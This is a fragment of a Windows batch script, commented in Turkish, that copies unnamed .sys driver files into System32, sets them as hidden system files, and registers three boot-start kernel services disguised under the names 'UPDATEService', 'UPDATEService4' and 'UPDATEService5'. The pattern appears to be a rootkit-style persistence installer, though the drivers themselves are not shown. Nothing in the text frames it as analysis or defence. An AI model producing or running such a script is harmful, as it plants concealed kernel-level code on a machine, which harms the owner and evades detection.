...
if exist "%~dp0x123.sys" (
    copy /y "%~dp0x123.sys" "%system32Dir%"
)
if exist "%~dp0x125.sys" (
    copy /y "%~dp0x125.sys" "%system32Dir%"
)

:: Dosyaları sistem dosyası olarak ayarla ve gizle
attrib +s +h "%system32Dir%x123.sys"
attrib +s +h "%system32Dir%x124.sys"
attrib +s +h "%system32Dir%x125.sys"

:: Yeni servisleri oluştur
C:\Windows\system32\cmd.exe /c sc create x123 binPath= "C:\Windows\System32\x123.sys" DisplayName= "UPDATEService" start= boot tag= 2 type= kernel group="System Reserved"
C:\Windows\system32\cmd.exe /c sc create x124 binPath= "C:\Windows\System32\x124.sys" DisplayName= "UPDATEService4" start= boot tag= 2 type= kernel group="System Reserved"
C:\Windows\system32\cmd.exe /c sc create x125 binPath= "C:\Windows\System32\x125.sys" DisplayName= "UPDATEService5" start= boot tag= 2 type= kernel group="System Reserved"
